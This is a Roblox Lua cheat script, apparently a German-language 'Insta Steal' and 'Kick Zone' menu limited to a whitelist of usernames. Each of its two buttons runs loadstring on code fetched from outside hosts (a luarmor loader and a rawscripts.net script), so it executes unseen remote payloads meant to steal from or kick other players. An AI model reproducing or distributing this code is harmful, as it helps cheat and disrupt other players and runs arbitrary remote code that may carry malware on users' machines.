local Players = game:GetService("Players")
local LP = Players.LocalPlayer
local wl = {"Ilaykingo18", "Ilaykingo18acc4", "h0cker767"}
local ok = false

-- Whitelist Check
for _, v in ipairs(wl) do 
    if LP.Name == v then ok = true break end 
end

if not ok then 
    LP:Kick("Kein Zugriff: Du stehst nicht auf der Whitelist!") 
    return 
end

-- GUI Setup
local sg = Instance.new("ScreenGui", LP:WaitForChild("PlayerGui"))
sg.Name = "IlaysScriptV2"
sg.ResetOnSpawn = false

local main = Instance.new("Frame", sg)
main.Size = UDim2.new(0, 320, 0, 220)
main.Position = UDim2.new(0.5, -160, 0.5, -110)
main.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
main.Active = true
main.Draggable = true
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 15)

local stroke = Instance.new("UIStroke", main)
stroke.Thickness = 2
stroke.Color = Color3.fromRGB(0, 130, 255)

local title = Instance.new("TextLabel", main)
title.Size = UDim2.new(1, 0, 0.2, 0)
title.Position = UDim2.new(0, 0, 0.05, 0)
title.BackgroundTransparency = 1
title.Text = "❄️ ILAY'S SCRIPT"
title.TextColor3 = Color3.new(1, 1, 1)
title.TextSize = 20
title.Font = Enum.Font.GothamBold

-- Button 1: Insta Steal
local btnSteal = Instance.new("TextButton", main)
btnSteal.Size = UDim2.new(0.85, 0, 0.3, 0)
btnSteal.Position = UDim2.new(0.075, 0, 0.3, 0)
btnSteal.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
btnSteal.Text = "⚔️ Insta Steal"
btnSteal.TextColor3 = Color3.fromRGB(80, 170, 255)
btnSteal.TextSize = 18
btnSteal.Font = Enum.Font.GothamBold
Instance.new("UICorner", btnSteal).CornerRadius = UDim.new(0, 8)

-- Button 2: Kick Zone
local btnKick = Instance.new("TextButton", main)
btnKick.Size = UDim2.new(0.85, 0, 0.3, 0)
btnKick.Position = UDim2.new(0.075, 0, 0.65, 0)
btnKick.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
btnKick.Text = "🚫 Kick Zone"
btnKick.TextColor3 = Color3.fromRGB(255, 80, 80)
btnKick.TextSize = 18
btnKick.Font = Enum.Font.GothamBold
Instance.new("UICorner", btnKick).CornerRadius = UDim.new(0, 8)

-- Close Button
local close = Instance.new("TextButton", main)
close.Size = UDim2.new(0, 30, 0, 30)
close.Position = UDim2.new(0.88, 0, 0.05, 0)
close.BackgroundTransparency = 1
close.Text = "✕"
close.TextColor3 = Color3.new(1, 0, 0)
close.TextSize = 20
close.MouseButton1Click:Connect(function() sg:Destroy() end)

-- Funktionalität
btnSteal.MouseButton1Click:Connect(function()
    sg:Destroy() -- GUI schließen nach Klick
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/76b1779d41784f4cfe496bedfb0f513c.lua"))()
end)

btnKick.MouseButton1Click:Connect(function()
    sg:Destroy() -- GUI schließen nach Klick
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-noks-anti-scam-ahh-daddy-chill-94360"))()
end)
